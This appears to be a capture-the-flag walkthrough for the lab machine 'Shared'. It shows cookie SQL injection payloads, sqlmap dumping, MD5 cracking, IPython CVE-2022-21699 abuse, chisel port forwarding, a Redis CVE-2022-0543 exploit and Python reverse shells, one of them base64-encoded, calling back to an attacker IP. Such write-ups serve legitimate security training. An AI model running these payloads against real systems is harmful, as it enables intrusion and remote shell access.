@@ -1,0 +1,264 @@
+                     Shared
+
+                                                                                  25th October 2022 / Document No D22.100.206
+                                                                                  Prepared By: C4rm3l0
+                                                                                  Machine Author: Nauten
+                                                                                  Difficulty: Medium
+                                                                                  Classification: Official
+
+                                  Synopsis
+
+Shared is a Medium Difficulty Linux machine that features a Cookie SQL Injection leading to a foothold,
+which is then used to escalate privileges by reverse engineering a Golang binary and leveraging two CVEs to
+gain a root shell.
+
+Skills Required
+
+      Web enumeration
+      Basic usage of Ghidra
+
+Skills Learned
+
+      Crafting specific payloads for SQL injections
+      Using ghidra to inspect reverse engineered binaries
+      Port forwarding
+
+Enumeration
+
+Nmap
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.172 | grep '^[0-9]' | cut -d '/' -f 1 |
+   tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.11.172
+When scanning the box using nmap , we can see a standard SSH service running on port 22 , as well as an
+Nginx webserver with SSL being hosted on their respective default ports. Interestingly, the version scan
+reveals the commonName value to be set to *.shared.htb , indicating that that a wildcard certificate is being
+used, allowing the same SSL certificate for all subdomains of shared.htb .
+
+HTTP
+
+Browsing to port 80 redirects us to shared.htb . After adding it to our /etc/hosts file and visiting the
+site again, we are redirected to port 443 and can see a PrestaShop instance.
+
+   echo "10.10.11.172 shared.htb" | sudo tee -a /etc/hosts
+
+The two notifications at the top of the page are of particular interest, prompting us to enumerate the new
+checkout process first.
+
+Analysing the Web application
+
+When testing out the web app's functionality, we discover that each time we add a product to our cart, a
+new cookie is created.
+   Set-Cookie custom_cart=%7B%22CRAAFTKP%22%3A%222%22%7D; expires=Mon, 31-Oct-2022
+   21:00:40 GMT; Max-Age=86400; path=/; domain=.shared.htb; secure; SameSite=None
+When clicking the "Proceed to Checkout" button, we are redirected to the subdomain
+checkout.shared.htb , which we also append to our /etc/hosts file.
+   echo "10.10.11.172 checkout.shared.htb" | sudo tee -a /etc/hosts
+There's not much functionality to be found here, so we take another look at the custom_cart cookie. Its
+initial content with only one item in the cart is {"CRAAFTKP":"1"} .
+
+Adding another product updates it to something along the lines of {"CRAAFTKP":"1", "7DA8SKYP": "1"} ,
+and finally, updating the quantity of the first product updates the cookie to {"CRAAFTKP":"2",
+"7DA8SKYP": "1"} . From this we can deduce that the cookies are of the format
+{"product_code":"quantity"} .
+Attempting to add a non-existent product by modifying the cookie to {"CRAAFTKP":"2","x": "1"} returns
+"Not Found" in the list.
+Seeing as only existing products are displayed, we can assume that there is a database at play in the
+backend. With that in mind, we now try injecting special characters to see if we can spot an SQL Injection.
+Trying both {"CRAFFTKP'":"1"} and {"CRAAFTKP\"":"1"} (single and double quotes), returns an empty
+cart:
+
+Using: {"CRAAFTKP'#":"1"} (terminating the query with a comment # ) shows the cart with content again:
+
+This strongly suggests that the query is vulnerable to SQLi; we try a UNION injection to verify. {"CRAAFTKP'
+UNION SELECT 1#":"1"} and {"CRAAFTKP' UNION SELECT 1,2#":"1"} return an empty cart. However,
+when we try adding a third column, the cart is returned with the content: {"CRAAFTKP' UNION SELECT
+1,2,3#":"1"} . This likely means that the remote query selects 3 fields.
+Surprisingly, neither 1 , 2 , nor 3 is returned, but rather the same product code as before. Putting a single
+quote solely on the second product-code, using the cookie {"CRAAFTKP":"1","7DA8SKYP'":"1"} , we can
+see that the second product code gets stripped.
+
+We can therefore deduce that for each of the rows that are displayed, a separate query is used, meaning
+only one result row per query is expected, which would also explain why we didn't get anything back with
+our UNION injection. Given the current scenario, we need to adjust the SQL injection statement to print the
+result of the second row, which can be achieved using the LIMIT clause, wherein we can also specify an
+offset . Using the syntax LIMIT [offset,] row_count , we now submit the following payload:
+{"CRAAFTKP' UNION SELECT 1,2,3 LIMIT 1,1#":"1"} .
+We can now successfully see the value in the second column of our UNION injection. Our supsicions of SQLi
+are ultimately confirmed after injecting the palyoad {"CRAAFTKP' UNION SELECT 1,version(),3 limit
+1,1#":"2"} , displaying the SQL version used by the server.
+
+Foothold
+
+Now that we have confirmed that we can inject SQL commands into the cookie, we automate the
+exploitation process using sqlmap .
+
+   sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --flush --
+   fresh-queries --level=3 --risk=3
+
+Having found the necessary payloads, sqlmap can now enumerate databases and dump tables for us:
+   sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --level=3 --
+   risk=3 --fresh-queries --dbs
+Seeing as information_schema is a default database, we look at checkout first and start by listing the
+available tables.
+
+   sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --level=3 --
+   risk=3 --fresh-queries -D checkout --tables
+
+Nothing interesting in the product table; we proceed to check the user table.
+   sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --level=3 --
+   risk=3 --fresh-queries -D checkout -T user --dump
+
+We find the username james_mason , as well as a hash. Judging from its length, this appears to be an MD5
+hash; we run hashid to verify.
+Armed with this knowledge, we can now attempt to brute force the hash using JohnTheRipper .
+   john --wordlist=/usr/share/wordlists/rockyou.txt james_mason.hash --format=RAW-MD5
+John successfuly cracks the MD5 hash revealing the password to be Soleil101 . We can now SSH into the
+box using the credentials james_mason:Soleil101 .
+
+Lateral Movement
+
+When running the id command, we can see that james_mason is part of the developer group.
+
+Moreover, if we check for other members of the group, we can see that dan_smith is also listed.
+   cat /etc/group | grep developer
+
+In order to further enumerate the machine, we download the pspy binary onto the box to get a better look
+at the processes being ran. While hosting a python http server on our local machine, we use wget to
+download the binary into the /tmp/ directory.
+
+   python3 -m http.server 4444
+We apply execution priliveges to the binary and then run it.
+
+It appears that the user dan_smith is periodically accessing the /opts/scripts_review/ directory and
+running IPython , which is a command shell used for interactive computing. We check the version of the
+binary to check for potential vulnerabilities.
+A quick search yields CVE-2022-21699 and its corresponding PoC. It is explained that the vulnerability stems
+from IPython executing untrusted files in the Current Working Directory (CWD). IPython primarily uses
+profiles for configuration. In a nutshell, when you run the command ipython , the program will look for a
+profile_x directory by calling os.getcwd() , which returns the Current Working Directory path.
+Furthermore, if a subdirectory with the name startup is found, any .py or .ipy scripts within that
+directory will be ran at the beggining of the IPython session.
+
+The vulnerable code on GitHub illustrates this quite clearly; first os.getcwd() is checked, and afterwards
+ipython_dir .
+
+   dirname = u'profile_' + name
+   paths = [os.getcwd(), ipython_dir]
+   for p in paths:
+
+          profile_dir = os.path.join(p, dirname)
+          if os.path.isdir(profile_dir):
+
+With that in mind, we now adapt a similar folder structure as in the PoC on the target machine. Since the
+program is ran in the /opt/scripts_review directory, we create the two sub-folders profile_default
+and startup , as well as a quick python payload that writes a file into /dev/shm :
+
+   mkdir -m 777 /opt/scripts_review/profile_default && mkdir -m 777
+   /opt/scripts_review/profile_default/startup && echo 'with open("/dev/shm/test123", "w")
+   as f: f.write("test")' > /opt/scripts_review/profile_default/startup/test123.py
+
+After about a minute, we find that test123.py has indeed been written to /dev/shm , and is owned by
+dan_smith .
+
+   mkdir -m 777 /opt/scripts_review/profile_default && mkdir -m 777
+   /opt/scripts_review/profile_default/startup && echo 'with open("/dev/shm/test123", "w")
+   as f: f.write("test")' > /opt/scripts_review/profile_default/startup/test123.py
+
+After about a minute, we find that test123.py has indeed been written to /dev/shm , and is owned by
+dan_smith .
+Having confirmed that we can execute code as dan_smith , we can now easily get a reverse shell in the
+same fashion.
+We use the following python payload:
+
+   import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+   s.connect(("10.10.14.30",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
+   os.dup2(s.fileno(),2); import pty; pty.spawn("sh")
+Combining it with our prior method yields this final bash command:
+   mkdir -m 777 /opt/scripts_review/profile_default && mkdir -m 777
+   /opt/scripts_review/profile_default/startup && echo 'import socket,subprocess,os;
+   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.30",4444));
+   os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty;
+   pty.spawn("sh")' > /opt/scripts_review/profile_default/startup/test123.py
+We successfully receive a reverse shell as dan_smith :
+
+The user flag can be found at /home/dan_smith/user.txt , and the id_rsa private SSH key can be used
+for persistent access as dan_smith .
+
+Privilege Escalation
+
+Enumeration
+Enumeration
+
+After running id , we can see that dan_smith is part of the sysadmin group. Searching for files related to
+the aforementioned group yields interesting results:
+
+   find / -path /sys -prune -o -path /proc -prune -o -group sysadmin 2>/dev/null
+
+The file is a Golang compiled, 64-bit binary.
+
+Looking at the machine's local ports reveals that there is a local instance of Redis listening on port 6379 .
+
+The Redis binary accesses the local instance using a password, and proceeds to run the INFO command.
+We try accessing the local instance directly, using redis-cli , but it is password protected.
+
+Seeing as the Golang binary can issue commands, we might be able to extract a hardcoded password by
+reversing it.
+
+Reversing the binary
+To begin with, we download the binary locally, using dan_smith 's private SSH key.
+   scp -i id_rsa dan_smith@10.10.11.172:/usr/local/bin/redis_connector_dev ./
+
+We find an interesting article that walks us through reverse engineering a Golang binary with Ghidra .
+After importing the binary into the program and letting it automatically analyse it, we take a look at the
+main.main decompiled pseudocode.
+
+There is nothing particularly interesting to be found, however, we can see data being stored at two
+addresses. We can have a better look by double-clicking on them one at a time, starting with
+&DAT_0067171e :
+We can see that at this specific location, the host value of the connection is stored. Moving on to
+&DAT_00671c55 , the password is revealed.
+However, as the aforementioned article mentions, the last two letters are to be ignored:
+
+In our case, it is 0x10 , or 16 characters.
+We can now try authenticating on the local Redis instance using the extracted password:
+F2WHqJUz2WEz=Gqq
+Running the INFO command shows us the version used, which we can look up for potential vulnerabilities.
+
+A quick search yields CVE-2022-0543, as well as a PoC; the caveat is that we have to run the PoC locally and
+forward the Redis port on the target machine.
+In order to forward port 6379 to our local machine, we use chisel, which we upload using a python HTTP
+server.
+
+   python3 -m http.server 1234
+
+Locally, we run chisel in server mode, listening on port 4444 .
+   ./chisel server -p 4444 --reverse -v
+Afterwards, we connect back to the server using the uploaded chisel binary.
+
+   ./chisel client 10.10.14.30:4444 R:6379:localhost:6379
+
+And on our local shell:
+
+Using chisel, we have now exposed the target's local 6379 port to our machine, on the same port. We can
+now run the CVE script, after modifying it slightly to allow for authenticated connections. The following line
+is altered:
+
+   r = redis.Redis(host = ip,port = port)
+The new line reads:
+
+   r = redis.Redis(host = ip,port = port, password="F2WHqJUz2WEz=Gqq")
+We now run it, remembering to point it to the forwarded port on localhost:6379 .
+We can now execute commands as root . We can upgrade this to a reverse shell by piping a base64 -
+encoded, python reverse shell to bash :
+
+   echo
+   cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZ
+   fSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjMwIiw0MjQyKSk7b3MuZHVwMi
+   hzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9yd
+   CBwdHk7IHB0eS5zcGF3bigic2giKSc= | base64 -d | bash
+We receive the shell using netcat.
+
+The final flag can be found at /root/root.txt .
+
